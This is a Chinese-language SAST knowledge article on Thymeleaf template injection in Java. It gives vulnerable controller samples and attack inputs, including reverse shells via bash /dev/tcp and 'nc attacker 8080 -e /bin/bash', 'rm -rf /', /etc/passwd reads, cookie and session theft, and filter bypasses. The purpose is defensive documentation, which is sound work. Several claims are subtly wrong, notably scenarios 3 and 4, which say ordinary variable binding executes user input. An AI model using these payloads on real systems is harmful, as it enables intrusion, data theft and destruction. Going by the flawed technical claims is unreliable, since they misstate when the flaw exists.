# Java语言Thymeleaf模板注入漏洞

> 来源：ChanziSAST 规则库语义规则提取（知识整理，含中文漏洞详解）。
> 规则 ID：`any_thymeleaf_ssti` · 类别：ssti · 关键 sink：process, processThrottled
> 说明：原文为 cypher 语义查询（不可直接挂 semgrep），下方「知识正文」为规则自带的中文漏洞详解，
> 提取时未改写；配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java语言Thymeleaf模板注入漏洞
Thymeleaf是Java生态中主流的服务端模板引擎，主打“自然模板”特性（模板文件可直接作为静态HTML运行），广泛用于Spring Boot等框架的Web开发。模板注入漏洞本质是**用户可控输入未经过滤直接嵌入Thymeleaf模板解析流程**，导致攻击者构造恶意模板语法执行任意代码、窃取数据或控制服务器，其风险等级通常为高危/严重。

以下从漏洞原理、触发场景、不同攻击路径（按Thymeleaf版本/配置划分）、典型利用方式等维度完整描述：

## 一、漏洞核心原理
Thymeleaf的模板解析分为“静态解析”和“动态渲染”两个阶段：
1. 静态解析：加载模板文件（如`.html`），识别Thymeleaf专属语法（如`${}`、`*{}`、`th:`前缀）并构建解析树；
2. 动态渲染：将上下文（Context）中的变量值代入解析树，生成最终HTML响应。

模板注入的核心是：**攻击者通过输入可控的字符串，让Thymeleaf将其当作模板语法而非普通文本解析执行**。正常场景下，用户输入应作为“变量值”代入模板；漏洞场景下，用户输入直接成为“模板语法的一部分”，从而突破变量边界，执行任意表达式、调用Java方法甚至执行系统命令。

Thymeleaf的表达式语言（Thymeleaf Expression Language，简称Thymeleaf EL）基于OGNL（Object-Graph Navigation Language）/Spring EL（视集成环境而定），这是漏洞可被利用的关键——EL表达式支持调用Java类、方法、访问属性，攻击者可通过构造EL表达式实现任意代码执行。

## 二、触发漏洞的前提条件
模板注入的触发需同时满足以下核心条件：
1. **输入可控**：用户输入（如URL参数、表单、Cookie、Header等）能进入Thymeleaf模板的解析流程；
2. **模板拼接/动态生成**：开发人员未使用“变量绑定”，而是直接拼接用户输入到模板字符串/文件中；
3. **无有效过滤**：未对用户输入中的Thymeleaf语法字符（如`${}`、`th:`、`[[ ]]`）进行转义或过滤；
4. **解析权限足够**：Thymeleaf运行时拥有足够的类加载、方法调用权限（默认配置下已满足）。

## 三、不同场景下的漏洞表现（按触发方式划分）
### 场景1：直接拼接用户输入到模板字符串（最常见）
开发人员为快速实现动态内容，未使用`context.setVariable()`绑定变量，而是直接将用户输入拼接到模板字符串中，触发解析执行。

#### 示例代码（漏洞版）：
```java
@GetMapping("/greet")
public String greet(@RequestParam String name, Model model) {
    // 危险：直接拼接用户输入到模板字符串，而非绑定变量
    String template = "<div>Hello: " + name + "</div>";
    // 解析并渲染拼接后的模板
    Context context = new Context();
    String result = templateEngine.process(new StringTemplateResource(template), context);
    model.addAttribute("content", result);
    return "index";
}
```

#### 攻击利用：
当用户访问`/greet?name=${T(java.lang.Runtime).getRuntime().exec("calc.exe")}`时，Thymeleaf会将`${...}`当作合法EL表达式解析：
- `T()`：Thymeleaf EL中用于加载Java类的语法；
- `java.lang.Runtime.getRuntime().exec()`：执行系统命令；
- 最终触发服务器执行`calc.exe`（Windows）或`bash -i >& /dev/tcp/xxx/xxx 0>&1`（Linux反弹Shell）。

### 场景2：动态模板文件路径+内容注入
开发人员允许用户控制模板文件的路径或名称，且模板文件内容可被用户篡改/注入，导致恶意模板被加载解析。

#### 示例代码（漏洞版）：
```java
@GetMapping("/loadTemplate")
public String loadTemplate(@RequestParam String templateName) {
    // 危险：用户可控模板路径，无校验
    return "templates/" + templateName;
}
```

#### 攻击利用：
攻击者构造参数`templateName=malicious.html`，其中`malicious.html`包含恶意Thymeleaf语法：
```html
<div th:text="${T(java.lang.ProcessBuilder).new('rm -rf /').start()}"></div>
```
当模板引擎加载并解析该文件时，直接执行删除服务器文件的命令。

### 场景3：Thymeleaf内联表达式注入（[[...]]/[(...)]）
Thymeleaf支持“内联表达式”，无需`th:`前缀即可解析EL表达式，常见于动态文本渲染，易被忽视。

#### 示例代码（漏洞版）：
```java
@GetMapping("/inline")
public String inline(@RequestParam String content, Model model) {
    // 危险：内联表达式未转义，用户输入直接作为内联内容
    model.addAttribute("content", content);
    return "inline-page"; // 页面中包含 <div>[[${content}]]</div>
}
```

#### 攻击利用：
攻击者输入`content=${T(java.lang.Runtime).getRuntime().exec("nc attacker 8080 -e /bin/bash")}`，页面内联解析时执行反弹Shell命令；
若开发人员错误使用“无转义内联”`[(...)]`（`[( ${content} )]`），则风险更高——无转义的内联会直接执行表达式，而非转义输出。

### 场景4：Spring Boot集成下的模板注入（结合Spring EL）
在Spring Boot中，Thymeleaf默认集成Spring EL（SPEL）而非原生OGNL，攻击者可利用SPEL表达式特性实现注入，语法与OGNL略有差异，但危害一致。

#### 示例代码（漏洞版）：
```java
@GetMapping("/spring-el")
public String spel(@RequestParam String input, Model model) {
    model.addAttribute("userInput", input);
    return "spel-page"; // 页面包含 <div th:text="${userInput}"></div>
}
```

#### 攻击利用：
SPEL表达式构造：`userInput=T(java.lang.Runtime).getRuntime().exec("whoami")`
或更隐蔽的SPEL语法：`userInput=#root.getClass().forName("java.lang.Runtime").getRuntime().exec("id")`

### 场景5：Thymeleaf 3.x vs 2.x的差异（版本相关触发）
Thymeleaf 2.x和3.x的语法、解析逻辑差异，导致注入场景略有不同：
#### （1）Thymeleaf 2.x特性
- 支持OGNL表达式，语法更灵活（如直接调用静态方法、访问私有属性）；
- 对`th:each`、`th:if`等标签的参数校验更宽松，易注入；
- 示例攻击表达式：`${#ctx.getVariables().put('cmd', T(java.lang.Runtime).getRuntime().exec('ls'))}`

#### （2）Thymeleaf 3.x特性
- 默认禁用部分危险OGNL语法（如直接访问`java.lang.Runtime`），但可通过绕过（如间接加载类）突破；
- 新增“自然模板”的严格解析模式，但开发人员常关闭该模式以兼容旧模板；
- 绕过示例：`${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}`（利用第三方类间接读取文件）。

### 场景6：模板布局/片段（Fragment）注入
Thymeleaf支持模板片段复用（`th:replace`/`th:include`），若片段名称/参数可控，可注入恶意片段。

#### 示例代码（漏洞版）：
```java
@GetMapping("/fragment")
public String fragment(@RequestParam String frag, Model model) {
    model.addAttribute("fragmentName", frag);
    return "layout"; // 页面包含 <div th:replace="~{fragments/${fragmentName}}"></div>
}
```

#### 攻击利用：
攻击者构造`frag=malicious :: evil`，其中`malicious`模板的`evil`片段包含：
```html
<div th:with="cmd=${T(java.lang.Runtime).getRuntime().exec('netstat -an')}"></div>
```
模板引擎解析片段时执行命令。

## 四、非代码执行类的模板注入（低危但仍有害）
并非所有模板注入都会直接执行代码，部分场景下攻击者可通过注入实现：
1. **敏感数据窃取**：`${#httpServletRequest.getCookies()}`、`${#session.getAttribute('userToken')}` 窃取Cookie、Session；
2. **服务器信息泄露**：`${T(java.lang.System).getProperty('user.dir')}`、`${T(java.lang.System).getProperty('java.version')}` 获取服务器路径、Java版本、系统信息；
3. **XSS叠加**：若模板注入未执行代码，但未转义输出，可构造`${'<script>alert(1)</script>'}` 触发XSS（虽Thymeleaf默认转义HTML，但内联/无转义场景可绕过）；
4. **拒绝服务（DoS）**：`${T(java.lang.Thread).sleep(10000)}` 构造大量耗时表达式，耗尽服务器资源。

## 五、漏洞触发的边界情况（易被忽视的场景）
1. **输入过滤不彻底**：仅过滤`${}`但未过滤`*{}`（选择变量表达式）、`#{}`（消息表达式），攻击者可改用`*{T(java.lang.Runtime).getRuntime().exec('cmd')}` 绕过；
2. **编码转换绕过**：将恶意表达式URL编码（`%24%7B...%7D`）、HTML实体编码（`&#36;&#123;...&#125;`），若开发人员未解码直接拼接，Thymeleaf解析时会自动解码执行；
3. **多参数拼接注入**：单个参数被过滤，但多个参数拼接后形成完整恶意表达式（如`param1=${T(java.lang.Runtime)` + `param2=.getRuntime().exec('cmd')}`）；
4. **模板缓存导致的延迟触发**：Thymeleaf默认缓存解析后的模板，若注入的恶意模板首次未执行，缓存刷新后会触发执行；
5. **低权限环境下的注入**：即使服务器运行在低权限账户下，仍可通过注入读取敏感配置文件（如`/etc/passwd`、`application.properties`），或发起内网横向攻击。

## 总结
Thymeleaf模板注入的核心风险在于“用户输入突破‘数据’边界，成为‘模板语法’”，其攻击路径与Thymeleaf版本、集成环境（原生/ Spring Boot）、模板使用方式（拼接/内联/片段）强相关。无论是否直接执行系统命令，只要用户输入可控制模板解析流程，就可能导致信息泄露、权限提升甚至服务器接管，是Java Web开发中典型的高危漏洞类型。

